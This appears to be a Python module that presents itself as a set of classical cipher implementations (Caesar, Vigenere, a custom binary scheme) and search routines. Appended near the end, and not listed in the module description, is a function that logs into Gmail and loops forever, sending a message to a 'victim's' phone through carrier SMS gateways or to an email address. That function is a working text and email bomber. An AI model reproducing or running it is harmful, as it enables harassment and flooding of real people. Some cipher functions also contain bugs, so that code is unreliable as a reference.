# -----------------------------------------------------------------------------
# Name: talalprotocol
# Purpose: provide various encryption algorithms
#
# Author: Talal Khalil
# Start Date: 8/01/2016
# Latest mod: 7/29/2017
#
# -----------------------------------------------------------------------------

"""
This module provides the following encryption functions:

1. Vigenere Cipher
2. Caesar Cipher
3. Binary Encryption algorithm (custom)
4. Linear and Binary search algorithms

Notes:
    a. fix binary decryption
"""

import string, os, sys
import smtplib as smt

x = string.ascii_lowercase
english_alphabets = list(x)
string_punctuation = string.punctuation


class CaesarCipher(object):
    """
    Represents a class for the Caesar cipher
    """

    def __init__(self, key):
        self.key = key

    def CaesarEncryption(self, message):

        self.message = message
        self.message = self.message.lower()
        self.ciphered_text = ''

        check = True
        while check:
            if self.key < 0:
                print('Key must be positive. Try again')
                quit()
            else:
                check = False

        for char in self.message:
            if char.isdigit():
                self.ciphered_text += char
            elif char in string_punctuation:
                self.ciphered_text += char
            elif char in english_alphabets:
                self.ciphered_text += english_alphabets[(english_alphabets.index(char) +
                                                         self.key) % 26]
            else:
                self.ciphered_text += ' '

        print('Ciphered message:')
        return self.ciphered_text

    def CaesarDecryption(self, encrypted_message):

        self.encrypted_message = encrypted_message
        self.deciphered_text = ''

        check = True
        while check:
            if self.key < 0:
                print('Key must be positive. Try again')
                quit()
            else:
                check = False

        for char in self.encrypted_message:
            if char.isdigit():
                self.deciphered_text += char
            elif char in string_punctuation:
                self.deciphered_text += char
            elif char in english_alphabets:
                self.deciphered_text += english_alphabets[
                    (english_alphabets.index(char) -
                     self.key) % 26]
            else:
                self.deciphered_text += ' '

        print('Deciphered message: ')
        return self.deciphered_text


def vigenere_cipher(message, key):
    """
    This function ciphers any submitted message using Vigenere Cipher

    Encryption mathematical representation:
    vigenere_cipher(y) = (y + k) mod 26
    y: letter index   k: corresponding key letter index

    Parameters:
    message
    key

    Returns:
    ciphered text
    """
    message = message.lower()
    key = key.lower()

    key_list = []
    key_length = 0

    while key_length < len(message):
        for letter in key:
            if key_length < len(message):
                key_list.append(letter)
                key_length += 1
    # print(key_list)

    encrypted_message = ''
    index_value = 0
    key_pointer = 0

    for character in message:
        if character.isdigit():
            encrypted_message = encrypted_message + character

        elif character in string_punctuation:
            ciphered_text = encrypted_message + character

        elif character in english_alphabets:
            new_index_value = english_alphabets.index(key_list[key_pointer]) + \
                              english_alphabets.index(character)
            if new_index_value > 25:
                new_index_value -= 26
            encrypted_message = encrypted_message + (
                english_alphabets[new_index_value])
            key_pointer += 1
        else:
            encrypted_message = encrypted_message + ' '

    return encrypted_message


def vigenere_decipher(message, key):
    """
    This function deciphers any vigenere_ciphered message

    Parameters:
    message
    key

    Returns:
    deciphered message
    """
    key_length = 0
    key_list = []

    while key_length < len(message):
        for letter in key:
            if key_length < len(message):
                key_list.append(letter)
                key_length += 1

    decrypted_message = ''
    index_value = 0
    key_pointer = 0

    for character in message:
        if character.isdigit():
            decrypted_message = decrypted_message + character
        elif character in string_punctuation:
            decrypted_message = decrypted_message + character
        elif character in english_alphabets:
            new_index = english_alphabets.index(character) - \
                        english_alphabets.index(key_list[key_pointer])
            if new_index < 0:
                new_index += 26
            decrypted_message = decrypted_message + (english_alphabets[new_index])
            key_pointer += 1
        else:
            decrypted_message = decrypted_message + ' '

    return decrypted_message


class BinaryCipher(object):
    """
    Custom binary cipher

    """

    def __init__(self, message=''):
        # self.message = message
        # self.message = self.message.lower()
        self.message = message
        self.message = self.message.lower

    def convert_to_binary(self, item1):

        self.binary_value = 0
        digit_list = list(string.digits)
        string_punctuation = list(string.punctuation)

        if item1 in digit_list:
            # added 32 = 0100000 as a flag bit to indicate that a char is a digit
            item1 = int(item1) + 32
            self.binary_value = bin(item1)[2:].zfill(7)
        elif item1 in string_punctuation:
            item1 = string_punctuation.index(item1) + 64
            self.binary_value = bin(item1)[2:].zfill(7)
        else:
            self.binary_value = bin(item1)[2:].zfill(7)

        return self.binary_value

    def BinaryEncryption(self, message):

        self.message = message
        self.message = self.message.lower()
        self.encrypted_message = ''

        for char in self.message:
            if char.isdigit():
                digit_in_binary = self.convert_to_binary(char)
                self.encrypted_message += digit_in_binary
            elif char in string_punctuation:
                punc_in_binary = self.convert_to_binary(char)
                self.encrypted_message += punc_in_binary
            elif char in english_alphabets:
                index = english_alphabets.index(char)
                x = self.convert_to_binary(index)
                self.encrypted_message += x
            else:
                self.encrypted_message += ' '

                # self.encrypted_message += ' '

        return self.encrypted_message

        # Decryption logic needs modification
        # def BinaryDecryption(self, encrypted_message):
        #
        #     self.encrypted_message = encrypted_message
        #     self.decrypted_message = ''
        #
        #     chunks = self.encrypted_message.split(' ')
        #     print(chunks)
        #     chunks = [i.strip(' ') for i in chunks]
        #     print(chunks)
        #
        #     for i in chunks:
        #         flag = i[:2]
        #         if flag == '00':
        #             index = int(i[2:], 2)
        #             self.decrypted_message += english_alphabets[index]
        #         elif flag == '01':
        #             digit = int(i[2:], 2)
        #             digit = str(digit)
        #             self.decrypted_message += digit
        #         elif flag == '10':
        #             punctuation_index = int(i[2:], 2)
        #             self.decrypted_message += string_punctuation[punctuation_index]
        #         else:
        #             print('Wrong Input! There is an error! Try again!')
        #             quit()
        #
        #     return self.decrypted_message


def linear_search(item, list):
    """
    This function is an implementation of a linear search algorithm

    Parameters:
    item, list

    Returns:
    True/False depending if the item is found or not
    """
    found = False
    position = 0
    counter = 0

    while position < len(list) and not found:
        if list[position] == item:
            found = True
        else:
            position += 1
            counter += 1
    print('Number of searches before finding the item: ' + str(counter))
    return found


def binary_search(item, list):
    """
    This function is an implementation of a binary search

    Parameters:
    item, list

    Returns:
    True or False depending if the item is found or not
    """
    found = False
    counter = 0

    bottom_of_list = 0
    top_of_list = len(list) - 1

    while bottom_of_list <= top_of_list and not found:
        middle_of_list = (bottom_of_list + top_of_list) // 2
        if list[middle_of_list] == item:
            found = True
        elif item > list[middle_of_list]:
            bottom_of_list = middle_of_list + 1
        else:
            # item is in the bottom half
            top_of_list = middle_of_list - 1
        counter += 1
    print(' Number of searches before finding the item: ' + str(counter))

    return found


def double_penetrate(username, password, command_option, carrier_option, phone_number=None, email_address=None):
    """
    FOR RESEARCH AND OR TEAM STANDY USE ONLY - You are Warned
    username: Gmail Username
    password: Gmail Password
    command_option 1. Text Bomb 2. Email Bomb
    carrier_option: User def list_carriers() to show list of carriers,
        pass value into this var for selection
    phone_number: victims number, if command_option==1 this is required
    email_address: victims email, if command_option==2 this is required
    """
    print("\n\r\n\rWelcome to Double Penetration\n\r")

    obj = smt.SMTP("smtp.gmail.com:587")
    obj.starttls()
    obj.login(username, password)

    option = command_option

    if option == 1 and phone_number != None:
        double_penetrated = 0
        carrier = carrier_option

        if carrier == 1:
            double_penetrated = "@alltelmessage.com"
        if carrier == 2:
            double_penetrated = "@txt.att.net"
        if carrier == 3:
            double_penetrated = "@pcs.rogers.com"
        if carrier == 4:
            double_penetrated = "@messaging.sprintpcs.com"
        if carrier == 5:
            double_penetrated = "@tmomail.net"
        if carrier == 6:
            double_penetrated = "@msg.telus.com"
        if carrier == 7:
            double_penetrated = "@vtext.com"
        if carrier == 8:
            double_penetrated = "@vmobl.com"
        if carrier == 9:
            double_penetrated = "@sms.orange.pl"

        v_phone = str(phone_number) + double_penetrated
        message = input("Message: ")
        phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
                         % (username, "".join(v_phone), "".join(message)))

        while 1:
            obj.sendmail(username, v_phone, phone_message)
            print("Penetrating -> Control-C to SIGKILL")

    elif option == 2 and email_address != None:
        v_email = email_address
        message = input("Message: ")
        email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
                         % (username, "".join(v_email), "".join(message)))

        while 1:
            obj.sendmail(username, v_email, email_message)
            print("Penetrating -> Control-C to SIGKILL")
    else:
        print('Failed to penetrate through phone or email\n')
        print('Please check input *args and *kwargs to DP function')


def list_carriers():
    print("What is their carrier? \n"
          "1. Alltel \n"
          "2. AT&T \n"
          "3. Rogers \n"
          "4. Sprint \n"
          "5. T-Mobile \n"
          "6. Telus \n"
          "7. Verizon"
          "8. Virgin Mobile \n"
          "9. Orange \n"
          "Pass Number Into DP Function"
          " \n\r ")


def main():
    pass


if __name__ == '__main__':
    main()
